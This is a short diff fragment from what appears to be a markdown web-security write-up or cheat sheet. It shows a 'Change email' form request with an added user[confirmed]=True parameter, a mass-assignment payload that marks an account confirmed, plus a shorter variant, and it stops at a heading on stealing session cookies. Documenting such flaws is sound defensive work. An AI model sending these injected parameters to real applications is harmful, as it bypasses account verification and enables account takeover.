 
 //After
 _method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
+```
+
+```bash
+...&confirmed=True
 ```
 
 #### Stealing Session Cookies
